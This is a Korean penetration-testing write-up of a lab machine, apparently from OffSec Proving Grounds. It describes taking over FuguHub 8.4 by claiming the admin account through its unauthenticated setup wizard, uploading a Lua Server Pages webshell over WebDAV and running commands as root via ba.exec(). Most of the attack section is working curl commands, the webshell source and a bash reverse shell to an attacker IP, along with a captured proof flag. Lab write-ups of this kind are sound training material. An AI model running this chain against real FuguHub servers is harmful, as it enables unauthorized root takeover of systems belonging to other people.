---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/auth-bypass
  - tech/web/webdav
  - tech/web/file-upload
  - tech/enum/dirbust
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.25
ports: [22, 80, 8082, 9999]
services: [http, https, ssh]
cves: [CVE-2023-24078]
status: solved
manual_tags: true
manual_cves: true
manual_domain: true
manual_services: true
tech_count: 5
---
> [!info] 요약
> 타겟 `192.168.248.25` · Debian 11 · Fundamental · 플래그 1개(root 직행)
> 진입점: 8082 FuguHub 8.4 설정 마법사 미완료 → `/Config-Wizard/wizard/SetAdmin.lsp` 무인증 관리자 선점 → WebDAV `/fs/` 로 `.lsp` 업로드 → `ba.exec()` RCE
> 권한상승: 없음 — FuguHub 서비스가 root 로 구동. `ba.exec("id")` 첫 실행이 이미 `uid=0(root)`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.25

### Initial Access – 설정 마법사 미완료를 틈타 무인증으로 관리자 계정을 선점하고 WebDAV 로 .lsp 를 심어 root RCE 획득

**Vulnerability Explanation:** 네 결함이 체인됨.
- FuguHub 8.4 설정 마법사가 미완료 상태로 전 인터페이스에 노출 — `/Config-Wizard/wizard/SetAdmin.lsp` 가 무인증
- 관리자 부재를 «파일 존재 여부»(`/var/www/html/user.dat`)로 판정 → 인증 검사가 상태 검사로 대체됨. 가장 먼저 POST 한 자가 관리자(선착순)
- 생성 계정이 세 realm(`FuguHub`·`Web File Server`·`Content Management System`) 전부의 주체 → 곧바로 WebDAV 쓰기 권한
- Web-File-Server(`/fs/`) 공유 루트 = 웹 루트라 `PUT .lsp` 후 GET 시 Lua Server Pages 로 실행. 확장자·MIME 필터 없음

**Vulnerability Fix:**
- 설정 완료 전까지 `127.0.0.1` 바인딩 또는 디스크의 설치 토큰 요구(Jenkins 방식). 부팅 후 시간 창 제한도 유효
- 설정 상태를 공격자가 만들 수 없는 근거(서명된 부트스트랩 값)로 판정
- WebDAV 공유 루트를 웹 루트 밖으로 분리 · 업로드 디렉터리 스크립트 실행 비활성 · 실행 가능 확장자 거부

**Severity:** Critical — 무인증 원격 RCE, 서비스가 root 구동이라 즉시 시스템 장악

**Steps to reproduce the attack:**
1. `/Config-Wizard/wizard/SetAdmin.lsp` 에 무인증 POST 로 관리자 계정 생성
2. `admin` 자격증명으로 `/fs/` WebDAV 에 `.lsp` 웹셸 PUT
3. 웹 루트 경로로 GET 해 서버측 Lua 실행 확인(`7*7` → `49`)
4. `ba.exec("id")` 로 명령 실행 — 첫 실행이 이미 `uid=0(root)`
5. `setsid bash` 리버스셸로 인터랙티브 root 셸 획득

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.25 | TCP: 22, 80, 8082, 9999 |

전체 포트 스캔 원문. `22/tcp   open  ssh` 등 raw 서비스 라인은 그대로 보존:

```text
# Nmap 7.98 scan initiated Wed Aug 19 17:06:34 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Hub/nmap.log 192.168.248.25
Nmap scan report for 192.168.248.25
Host is up (0.093s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http       Barracuda Embedded Web Server
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-server-header: BarracudaServer.com (Posix)
|_http-title: Home
| http-webdav-scan: 
|   Server Date: Wed, 19 Aug 2026 08:09:16 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   Server Type: BarracudaServer.com (Posix)
|_  WebDAV type: Unknown
9999/tcp open  ssl/abyss?
|_ssl-date: 2026-08-19T08:09:19+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   93.37 ms 192.168.45.1
2   93.29 ms 192.168.45.254
3   93.46 ms 192.168.251.1
4   93.56 ms 192.168.248.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 17:09:20 2026 -- 1 IP address (1 host up) scanned in 165.88 seconds
```
— 출처: `~/PG/Hub/nmap.log`

읽는 법:
- 8082 = FuguHub 본체. `Server: BarracudaServer.com` 배너 + SSL 인증서 CN `FuguHub` 가 제품 확정
- 9999 = 같은 앱의 HTTPS 리스너. 근거 둘 — `bdd.conf` 의 `sslport=9999`, nmap `ssl-cert` 의 `commonName=FuguHub`. `curl -k https://T:9999/` 가 8082 와 동일한 Home 을 반환한다는 서술은 `[가정 — 산출물 미보존]` 이나, `ferox_9999.log` 가 `https://192.168.248.25:9999/` 를 대상으로 정상 완주한 것이 HTTPS 리스너라는 사실 자체는 확증
- `http-methods` 에 `PUT`·`MKCOL`·`MOVE` — WebDAV 생존 신호, 업로드 RCE 의심 근거
- 80 은 nginx 403 이나 버림 금지(아래 파일 유출 절)

nmap 이 9999 를 `ssl/abyss?` 로 라벨. `abyss` 는 `/usr/share/nmap/nmap-services` 에 `abyss 9999/tcp` 로 등재된 포트 기반 기본 이름이고, 꼬리의 `?` 는 «버전 지문 미확정» 표시임. `서비스명?` 의 `?` 를 봤으면 nmap 이 추측만 했다는 뜻이니 서비스명을 사실로 받지 말고 직접 붙어 확인할 것. 실제로는 FuguHub HTTPS 리스너.

`-sCV` 가 이 스캔의 값어치. `http-methods`·`http-webdav-scan`·`ssl-cert` 가 전부 NSE 산출물이라 빼면 WebDAV 도 CN=FuguHub 도 못 봄. `-Pn` 은 ICMP 차단 시 중단 방지, `--min-rate 5000` 이 `-p-` 를 165초로 줄임.

`nmap_quick.log`(`--top-ports 1000`)와 `allports.nmap`(`-p-`, 포트만)이 같은 4포트를 확증:

```text
# Nmap 7.98 scan initiated Wed Aug 19 17:09:12 2026 as: /usr/lib/nmap/nmap -sS -Pn --top-ports 1000 --min-rate 5000 -oN /home/kali/PG/Hub/nmap_quick.log 192.168.248.25
Nmap scan report for 192.168.248.25
Host is up (0.095s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8082/tcp open  blackice-alerts
9999/tcp open  abyss

# Nmap done at Wed Aug 19 17:09:13 2026 -- 1 IP address (1 host up) scanned in 0.87 seconds
```
— 출처: `~/PG/Hub/nmap_quick.log` (전량). `-p-` 포트 전용 스캔은 `~/PG/Hub/allports.nmap` — `Not shown: 65531 closed tcp ports` 로 같은 4포트를 확증

8082·9999 는 `nmap-services` 에 각각 `blackice-alerts 8082/tcp 0.000878`·`abyss 9999/tcp 0.004441` 로 등재돼 **top-1000 안**임. `--top-ports 1000` 스캔이 둘 다 잡은 것이 그 실측 근거. 이 박스에서 `-p-` 가 준 실익은 «발견»이 아니라 65535 전수 확인으로 「더는 없다」를 배제한 것. `-p-` 가 결정적인 경우는 등재되지 않은 고번호 포트일 때이고 [[Hawat]] 의 50080 이 그 예. 버전 판정 독립 근거 원칙과 함께 [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]] 참조.

#### 버전 판정 — 독립 근거 2개

정적 근거 3개가 서로 일치하나 전부 «2019년 배포 아카이브»라는 단일 출처에서 나온 값이라 독립 증거가 아님:

| 근거 | 값 | 성격 |
|---|---|---|
| `readme.txt` 첫 줄 | `Changes for 8.0   July 2019` | 정적 — 배포 시점 |
| SSL 인증서 `Not valid before` | `2019-07-16T19:15:09` | 정적 — 배포 시점 |
| 8082 인덱스 `Last-Modified` | `2019-07-19` | 정적 — 배포 시점 |

셋 다 «아카이브 생성 시점»을 세 각도에서 본 것일 뿐 실행 중인 바이너리와 무관. 런타임에 앱이 스스로 렌더한 값이 최종 근거:

```bash
curl -s -u admin:password http://192.168.248.25:8082/rtl/about.lsp | grep -i fuguhub
```
```text
<h2>FuguHub 8.4</h2>
<p>FuguHub is free to use for non-commercial or educational use...
```

실행 버전은 **8.4**. 배포본에 딸려온 changelog·인증서·정적 파일 mtime 이 갱신되지 않았을 뿐임. favicon·로고 해시로 버전을 가르려는 시도는 실패 — 8.0 과 8.4 가 바이트 동일이라 구분 불가. 해시 비교는 「다르면 버전이 다르다」만 말하고 「같으면 같다」는 성립하지 않음.

랩 브리핑은 이 박스를 8.1 / CVE-2023-24078 로 안내. 버전은 8.4 로 갈렸으나 악용 메커니즘은 동일 — 무인증 관리자 선점 → WebDAV `.lsp` 업로드 → RCE. 실제로 탄 것은 CVE-2023-24078 계열(NVD 가 `/FuguHub/cmsdocs/` 컴포넌트 RCE 로 명시). CVE-2024-27697 은 `customize.lsp` 편집을 악용하는 별개 취약점이고 이 박스는 건드린 적 없음 `[가정 — NVD 미공개(totalResults 0), 공개 PoC 설명 기준]`. 버전 인접성은 취약점 동일성의 근거가 아님.

> [!warning] `readme.txt`·인증서 날짜를 믿으면 8.0 으로 오판함
> 80/tcp nginx 가 FuguHub 설치 디렉터리(`/var/www/html`)를 그대로 서빙해 `readme.txt` 가 읽힘. 첫 줄이 `Changes for 8.0     July 2019` 이고 SSL 인증서·`Last-Modified` 까지 3중으로 「2019 / 8.0」 을 가리키나 전부 배포 아카이브 잔존물임. 버전 근거는 개수가 아니라 «생성 경로의 독립성»으로 셀 것.

#### 무인증 접근 표면

| 경로 | 코드 | 비고 |
|---|---|---|
| `/` | 200 | "Configuration Wizard must be completed" 배너 |
| `/Config-Wizard/` | 302 → `SetAdmin.lsp` | 무인증 |
| `/Config-Wizard/wizard/SetAdmin.lsp` | 200 | 무인증 — 진입점 |
| `/blog/`·`/photos.html`·`/Contact-Us.html` | 200 | CMS 공개 페이지 |
| `/rtl/about.lsp` | 401 → 인증 후 200 | 버전 확인. `[가정 — 타겟 정지로 무인증 접근 여부 재확인 불가]` |
| `/rtl/protected/*` | 401 | realm `FuguHub` |
| `/fs/` | 401 | realm `Web File Server` (WebDAV) |
| `/private/`·`/private/manage/` | 401 | realm `Content Management System` |

`/rtl/about.lsp` 는 본문 다수가 「인증 후 접근」을 전제하므로 `401 → 인증 후 200` 으로 둠. 타겟 정지로 재확인이 불가해 `[가정]`. 리버트 시 확인할 한 줄: `curl -s -o /dev/null -w "%{http_code}\n" http://TARGET:8082/rtl/about.lsp`.

WebDAV 메서드 확인:

```bash
curl -i -X OPTIONS http://192.168.248.25:8082/
```
```text
HTTP/1.1 200 OK
Server: BarracudaServer.com (Posix)
Allow: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
DAV: 1, 2
MS-Author-Via: DAV
```

401 응답의 realm 문자열이 `FuguHub`·`Web File Server`·`Content Management System` 셋으로 갈림 — 서버가 디렉터리별로 별도 인증 구성을 붙였다는 뜻. realm 목록 = 「인증이 붙은 디렉터리 목록」이고 그 목록에 없는 경로가 무인증 표면임(`/Config-Wizard/` 가 그렇게 튀어나옴). 이 박스는 `admin:password` 가 세 realm 전부에 통했음.

#### 80/tcp — 403 이라고 넘기면 안 되는 이유

루트 인덱스는 403 이나 문서 루트가 `/var/www/html`(FuguHub 설치 디렉터리 그 자체)임. feroxbuster 결과 전량:

```text
403      GET        7l        9w      153c http://192.168.248.25/cache
403      GET        7l        9w      153c http://192.168.248.25/
301      GET        7l       11w      169c http://192.168.248.25/data => http://192.168.248.25/data/
301      GET        7l       11w      169c http://192.168.248.25/themes => http://192.168.248.25/themes/
301      GET        7l       11w      169c http://192.168.248.25/applications => http://192.168.248.25/applications/
403      GET        7l        9w      153c http://192.168.248.25/trace
200      GET        2l        8w       87c http://192.168.248.25/LICENSE.txt
200      GET      572l     2423w    18730c http://192.168.248.25/readme.txt
301      GET        7l       11w      169c http://192.168.248.25/disk => http://192.168.248.25/disk/
```
— 출처: `~/PG/Hub/ferox_80.log` (`readme.txt` 18730c = 8.0 changelog 함정)

403 은 `/`·`/cache`·`/trace` 셋(153바이트 nginx 기본 에러 페이지)이고 `/data`·`/themes`·`/applications`·`/disk` 는 301(169바이트 후행 슬래시 리다이렉트)임. 301 은 그 디렉터리가 실재한다는 확정이고(nginx 는 없는 경로에 301 을 안 줌) 403 은 존재하되 인덱싱만 막힌 것. 스캔 결과를 요약할 때 상태코드를 합치지 말 것 — 301/403/401/200 은 각각 다른 다음 수를 지시함.

아래 파일들은 80 에서 실제로 내려받혔고(로컬 보존) 이 박스의 정보 유출 본체임. 다만 이 이름을 어떻게 알았는지의 기록은 남아 있지 않음 `[가정 — 제품 지식이나 /applications/Config-Wizard.zip 에서 왔을 가능성. ferox_80_files.log 는 -x conf,dat,zip,log,bak,txt 로 돌렸는데도 세 줄뿐이었고 raft-medium-files.txt 에 bdd·user.dat 자체가 없음]`:

| 경로 | 코드 | 크기 | 무엇 |
|---|---|---|---|
| `/bdd.conf` | 200 | 56 B | 설치 경로·포트. `~/PG/Hub/bdd.conf` 로 보존 |
| `/user.dat` | 200 | 467 B | FuguHub 사용자 DB. `~/PG/Hub/user.dat` 로 보존 |
| `/applications/Config-Wizard.zip` | 200 | 71872 B | 설정 마법사 소스 `[가정 — 산출물 미보존, 값은 노트 기록 기준]` |

```bash
curl -s http://192.168.248.25/bdd.conf
```
```text
drivedir="/var/www/html/cmsdocs"
port=8082
sslport=9999
```
— 출처: `~/PG/Hub/bdd.conf`

`user.dat`(467바이트)은 바이너리가 아니라 한 줄짜리 JSON:

```json
{"v":"FNW5DJWHcKEa0LlHmUZiKyeLWdU432yDav00yzU9qamEHEAdK6OZ38rlCHbefsuXVAsIzhTRH90h8WM2CUoZdx\/ZiDYVNVHDu0u4vyv5bT9UDPr6zdOIIdS3sjpdpBclyWo+qtL6OogwFXyuztcsmaStuMd1LnzZhinFEcE4egSbAj9lGi217m0UVBguHWrqEuxKUvMGkI5Ic3Y76qOTCs2JGZX7cjncoS4h\/ZSbimkIDRqRIDktoPTmVjUyyZ\/\/5fFwBiEHz0129eTHkgS1A4ejAn\/a2aEtwOtc08XSkMseO2gpV\/o7xNovBHiLRu\/jopb53yGymZgJRisq8WQ2pPYyWaDbHrKpxqx3kUdx3V\/b2ReLEwB\/dh0c\/OYu6VGWPbjy3WCuOkd6n+iOFMCCSAbgdVBUmnl6aMk6LrEmRVrt0O\/hl8MCERmi3xQt6FbH"}
```
— 출처: `~/PG/Hub/user.dat`

키 하나(`v`)에 base64 덩어리 하나. `file` → `JSON text data`, 디코드하면 알려진 해시 접두사(`$1$`·`$6$`·`$apr1$`)가 없는 불투명 blob 이라 크랙 대상 아님(제품 고유 암호화 포맷). 그래도 설치 경로(`/var/www/html`)를 확정해주고, 셸 획득 후 드롭한 파일을 80 으로 회수하는 통로로 쓸 수 있음. 워드리스트에 없는 파일명 열거는 [[_PLAYBOOK#A-23. 워드리스트에 없는 파일명은 브루트포싱으로 못 찾는다]].

#### feroxbuster — 8082 정상, 9999 통째로 위양성

```bash
feroxbuster -u http://192.168.248.25:8082/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,lsp -t 100 -o ferox_8082.log
```
```text
200      GET        2l        3w      488c http://192.168.248.25:8082/images/file.gif
200      GET       67l      449w     4973c http://192.168.248.25:8082/Contact-Us.html
401      GET        1l        2w       21c http://192.168.248.25:8082/rtl/protected/admin/
401      GET        1l        2w       21c http://192.168.248.25:8082/rtl/protected/wfslinks.lsp
200      GET      147l      606w     6924c http://192.168.248.25:8082/
404      GET       45l      105w     1283c http://192.168.248.25:8082/backups.php
```
— 출처: `~/PG/Hub/ferox_8082.log`

`-x` 에 `lsp` 를 넣은 것이 핵심 — 빼면 이 제품의 실행 가능 엔드포인트를 못 봄. 제품이 확정되면 그 제품의 확장자를 반드시 추가할 것. 9999 스캔은 `-C 302` 를 안 걸어 통째로 위양성 — BarracudaServer 가 존재하지 않는 경로에도 302 를 줌:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:9999/nonexistent-abc123
```
```text
302
```

`/2009`·`/App_Data`·`/fileadmin`·`/downloader`·`/openx` 등 **결과 62건 전량**이 이 302 위양성이었음(`ferox_9999.log` 의 결과 라인 62개가 모두 302, 다른 상태코드 0건). fuzz 전에 존재할 리 없는 경로를 한 번 때려 서버의 「없음」 응답을 확정하고 `-C 302` 로 거를 것. 응답이 성공을 뜻하지 않는 패턴은 [[_PLAYBOOK#A-15. 302 여도 본문이 있다 / 블랙리스트가 302 를 오판한다]].

### Initial Access – 관리자 선점 → .lsp 업로드 → ba.exec

이 박스에서 실제로 탄 재현 경로. 명령 실행이 막혔을 때 살아 있는 API 를 찾는 절차는 [[_PLAYBOOK#B-13. disable_functions 우회 (PHP)]], WebDAV 업로드 RCE 승격 조건은 [[_PLAYBOOK#B-1-36. 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기]], 후보 필드 배치 프로빙은 [[_PLAYBOOK#B-1-11. 후보 파라미터 이름은 배치로 쏜다 — 대조군 필수]].

#### Step 1 — 관리자 계정 선점

`/Config-Wizard/wizard/SetAdmin.lsp` 는 인증이 없음. 자기 자신에게 POST 해 관리자 계정 생성:

```bash
curl -s -i -X POST 'http://192.168.248.25:8082/Config-Wizard/wizard/SetAdmin.lsp' \
     -d 'email=admin@hub.local&user=admin&password=password'
```
```text
HTTP/1.1 200 OK
...
Administrator Account Saved
```

자격증명 확보: `admin` / `password`(HTTP Basic). `email=` 값은 형식만 맞으면 무엇이든 통과(`a@b.c` 로도 됨) — `admin@hub.local` 은 임의로 지은 값이지 인증서에서 온 값이 아님. 인증서 SAN 이 준 실제 도메인은 `FuguHub`·`FuguHub.local`·`localhost` 셋이고 `/etc/hosts` 등록 후보는 `FuguHub.local` 하나임.

성공 문구만 믿지 말고 401 → 200 전이로 인증을 확증:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:8082/rtl/protected/
curl -s -o /dev/null -w "%{http_code}\n" -u admin:password http://192.168.248.25:8082/rtl/protected/
```
```text
401
200
```

> [!warning] 이 공격은 한 번만 쓸 수 있다
> 계정 생성 후 같은 페이지가 `User database already saved` + `Delete the user database file: "/var/www/html/user.dat"` 로 바뀜. 다시 쓰려면 `user.dat` 를 지워야 하는데 그러려면 이미 셸이 필요함. 상태 머신이 `[설정 중]` → `[운영]` 으로 한 방향으로만 가므로 발견 즉시 잡아야 함.

> [!danger] Metasploit 모듈이 있으나 여기 쓰면 손해다
> CVE-2023-24078 은 Metasploit 모듈로도 유통됨 `[가정 — 실측 안 함]`. MSF 는 시험 전체에서 1대 한정이라 Fundamental 박스에 한 장을 소모할 이유 없음. 수동 체인은 아래 4요청이 전부.

#### Step 2 — .lsp 업로드로 서버측 실행 확인

Web-File-Server(`/fs/`)는 WebDAV 파일 매니저이고 공유 루트가 웹 루트와 같음. `PUT /fs/x.lsp` 로 올린 뒤 `GET /x.lsp`(웹 루트 경로)로 요청하면 LSP 로 실행됨 — 실측으로 확인한 것은 이 조합. RCE 전에 산술식으로 실행 자체를 먼저 확인:

```bash
printf '%s' '<?lsp response:write("PWNTEST=" .. tostring(7*7)) ?>' > /tmp/t1.lsp
curl -s -u admin:password -T /tmp/t1.lsp http://192.168.248.25:8082/fs/t1.lsp
curl -s -u admin:password http://192.168.248.25:8082/t1.lsp
```
```text
HTTP/1.1 201 Created
PWNTEST=49
```

`-T` 는 HTTP `PUT` 으로 파일 본문을 그대로 올림(`-d @파일` 은 POST+폼인코딩이라 WebDAV 업로드 안 됨). `-u admin:password` 는 `/fs/` 가 realm `Web File Server` 로 보호되니 필수. `printf '%s'` 는 개행 없이 파일을 만들기 위함 — `echo` 는 끝에 `\n` 을 붙여 응답에 빈 줄이 섞임. `49` 는 입력 어디에도 없으므로 에코가 아니라 실행임이 확정됨. `201 Created` 는 새 리소스 생성 확답(덮어쓰기면 `204 No Content`).

업로드는 `/fs/t1.lsp` 인데 실행은 `/t1.lsp` — 경로가 다른 것이 이 단계의 함정. `/fs/` 는 WebDAV 파일 매니저 네임스페이스이고 실행은 웹 루트 경로에서 확인함. `GET /fs/x.lsp` 가 무엇을 주는지는 이 박스에서 확인하지 않음 `[가정 — 파일 매니저가 소스를 그대로 반환할 가능성이 높음]`.

#### Step 3 — io.popen 차단 → ba.exec()

교과서적 Lua 웹셸은 `io.popen` 을 쓰는데 FuguHub 의 LSP 샌드박스가 이를 제거해둠 — `io.popen` 이 nil 이라 호출 자체가 실패(표준 Lua 라면 `attempt to call a nil value (field 'popen')`, 제품 런타임에 따라 문구는 다를 수 있음). 대신 Barracuda 런타임의 `ba.exec()` 가 살아 있고 stdout 을 캡처해 돌려줌. `pcall` 로 감싸 에러까지 응답에 찍게 만드는 것이 중요 — 뭐가 왜 막혔는지 보여야 다음 수를 고름:

```lua
<?lsp
local c = request:data("c") or "id"
local ok,a,b,cc = pcall(function() return ba.exec(c) end)
response:write("ba.exec ok="..tostring(ok).." => "..tostring(a).." | "..tostring(b).." | "..tostring(cc).."\n")
?>
```

```bash
curl -s -u admin:password -T /tmp/x.lsp http://192.168.248.25:8082/fs/x.lsp
curl -s -u admin:password --data-urlencode 'c=id' http://192.168.248.25:8082/x.lsp
```
```text
ba.exec ok=true => uid=0(root) gid=0(root) groups=0(root)
```

이미 `uid=0`. `request:data("c")` 는 GET/POST 양쪽에서 파라미터를 읽고 `or "id"` 는 기본값. 샌드박스 설계자가 표준 라이브러리의 위험 함수(`io.popen`·`os.execute`)는 지우면서 제품 확장 API(`ba.exec`)는 잊는 전형 — 표준 함수가 막혔다는 사실 자체가 커스텀 API 는 안 막혔다는 힌트.

#### Step 4 — 인터랙티브 root 셸

`c=id` 파라미터를 `--data-urlencode` 로 보내는 것이 핵심 — `-d` 로 보내면 리버스셸 `0>&1` 의 `&` 지점에서 파라미터가 잘림.

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s hub 'rlwrap nc -lvnp 4444'"
```
```bash
curl -s -u admin:password --data-urlencode \
    'c=setsid bash -c "bash -i >& /dev/tcp/192.168.45.207/4444 0>&1" &' \
    http://192.168.248.25:8082/x.lsp
```

리스너에 붙은 세션(이 인터랙티브 세션은 산출물 파일로 보존되지 않음 — 값은 노트 기록 기준):

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.25] 46868
root@debian:/var/www/html# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@debian:/var/www/html# id; hostname; cat /root/proof.txt
uid=0(root) gid=0(root) groups=0(root)
debian
702262325fd3a55a2f23d49e0256571c
```

`setsid ... &` 는 웹 요청이 셸 프로세스를 물고 늘어져 HTTP 응답이 안 돌아오는 것을 피함. `bash -c` 는 `>&`·`/dev/tcp` 를 해석할 셸을 명시(ba.exec 가 `/bin/sh` 로 넘기면 bash 전용 문법이 안 먹음). Debian 11 은 `python3` 기본 설치라 TTY 업그레이드가 통함. 리버스셸이 안 붙을 때의 점검 순서는 [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]], `python3` 부재 시 대안은 [[_PLAYBOOK#A-38. `python3` 가 없어 TTY 업그레이드가 안 된다]].

**Local.txt value:**
없음 — 이 박스는 플래그 1개(root 직행). root 셸에서 교차 확인:

```bash
root@debian:/var/www/html# find / -name local.txt 2>/dev/null
       (없음)
root@debian:/var/www/html# ls /root/
email4.txt  proof.txt
root@debian:/var/www/html# cat /root/email4.txt
MENURkBvZmZzZWMuY29t
root@debian:/var/www/html# grep -vE 'nologin|false' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
offsec:x:1000:1000:,,,:/home/offsec:/bin/bash
```

`/home/offsec` 은 비어 있고 포털 진행도 슬롯은 1개. `/root/email4.txt` 는 base64 → `0CTF@offsec.com` 인 미끼로 아무 데도 안 쓰임. `find` 무결과 + 슬롯 1개로 user 플래그 부재를 확정함 `[가정 — 위 인터랙티브 세션은 산출물로 미보존, 값·경로는 노트 기록 기준]`.

### Privilege Escalation – 없음 (FuguHub 서비스가 User=root 로 구동)

`ba.exec` 의 첫 실행이 이미 `uid=0(root)` 을 돌려줘 권한상승 단계가 통째로 없음. 근본 원인은 `Initial Access` 의 `Vulnerability Fix:`(앱을 비특권 계정으로 구동)가 이미 담음.

```bash
root@debian:/var/www/html# cat /etc/systemd/system/fuguhub.service
```
```text
[Unit]
Description=FuguHub Service
After=network.target

[Service]
ExecStart=/var/www/html/FuguHub
WorkingDirectory=/var/www/html
User=root
Group=root
Restart=always
```

`User=root` 명시 — 빠뜨린 것이 아니라 의도적 지정. `[가정 — 유닛 파일 원문 미보존]` 이 유닛 파일은 원본 노트부터 있던 블록이나 `~/PG/Hub/` 에 대응 산출물이 없어 원문 대조 불가. 제품 관례와 두 곳이 어긋남 — 같은 박스에서 회수한 `bdd.conf` 가 BarracudaDrive Daemon 계열이고 그 데몬 실행 파일은 통상 `bd`, 유닛명도 `bd.service` 류일 가능성. 다만 `ba.exec('id')` 가 실측으로 `uid=0(root)` 을 돌려줬으므로 서비스가 root 로 돈다는 사실 자체는 확정이고 불확실한 것은 유닛 파일의 정확한 내용·이름뿐. 리버트 시 확인: `systemctl list-units --type=service | grep -iE 'fugu|barracuda|bd'` 후 `systemctl cat <유닛>`.

FuguHub 는 8082·9999 만 쓰므로 1024 미만 특권 포트가 필요하지도 않은데 root 임 — 파일 서버 기능(Web-File-Server 가 「디스크 아무 곳이나」 공유하려면 광범위한 파일 접근 필요) 쪽으로 보임 `[가정]`. 애플리케이션 계층에서 코드 실행을 얻었는데 그 앱이 root 로 돌면 권한상승 장이 없어지는 패턴은 [[Hawat]](nginx·php-fpm `user root;`)과 동일. 관리 화면이 렌더한 경로로 실행 계정을 익스플로잇 전에 아는 반사는 [[_PLAYBOOK#B-1-40. 관리 화면이 렌더한 «경로»가 실행 계정을 말해준다 — 권한상승 유무를 익스플로잇 전에 안다]].

### Post-Exploitation

**Proof.txt value:**
`702262325fd3a55a2f23d49e0256571c`

플래그 값은 위 `Initial Access` 재현 절의 리버스셸 세션에서 `cat /root/proof.txt` 로 읽음. `proof_*.txt` 형식의 한 화면 증거 파일(`whoami; id; hostname; hostname -I; date; cat`)은 `~/PG/Hub/` 에 미보존 — 관측 없음. 스크린샷도 0장(박스 정지로 소급 촬영 불가).

**남긴 흔적**
- 타겟 웹 루트 `/var/www/html/` 에 `t1.lsp`·`en.lsp`·`sh9.lsp`·`x.lsp` 업로드됨. 인증 없이 웹으로 접근 가능한 웹셸이라 실무라면 제3자가 그대로 쓸 백도어
- 관리자 계정 `admin:password` 및 `/var/www/html/user.dat` 생성됨 — 되돌릴 수 없어 원 관리자가 설정 마법사를 열면 「이미 저장됨」을 보게 됨(탐지 신호)
- Kali 리스너 tmux 세션 `hub` 는 이름으로 종료. 랩 Stop/Revert 시 타겟 흔적 전부 소멸

## 관련

- CVE-2023-24078 — FuguHub 8.1 이하 인증 우회 → RCE(랩 브리핑이 안내한 번호, 이 노트가 실제로 탄 경로). Exploit-DB 51550 · NVD: `/FuguHub/cmsdocs/` 컴포넌트 RCE(CVSS 3.1 8.8 HIGH, CWE-94)
- CVE-2024-27697 — 이 노트의 경로와 무관한 별개 취약점. FuguHub 8.4 관리자 패널 `customize.lsp` 편집 Lua 주입 `[가정 — NVD 미공개]`
- FuguHub / Barracuda Application Server(Real Time Logic) — LSP(Lua Server Pages), `ba.*` 런타임 API
- WebDAV 메서드: RFC 4918 · HTTP Basic realm: RFC 7617
- [[Hawat]] — 웹서버가 root 구동이라 권한상승이 없던 동일 패턴
- [[Crane]] — 직전 박스, 같은 컬렉션. `setsid` 로 익스 멈춤 회피 · 「응답이 성공을 뜻하지 않는다」
- [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] — 「버전 판정은 독립 근거 2개」 패턴 색인
- [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]] · [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] · [[_PLAYBOOK#A-15. 302 여도 본문이 있다 / 블랙리스트가 302 를 오판한다]] · [[_PLAYBOOK#A-23. 워드리스트에 없는 파일명은 브루트포싱으로 못 찾는다]]
- [[_PLAYBOOK#B-1-11. 후보 파라미터 이름은 배치로 쏜다 — 대조군 필수]] · [[_PLAYBOOK#B-1-36. 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기]] · [[_PLAYBOOK#B-1-40. 관리 화면이 렌더한 «경로»가 실행 계정을 말해준다 — 권한상승 유무를 익스플로잇 전에 안다]] · [[_PLAYBOOK#B-13. disable_functions 우회 (PHP)]]
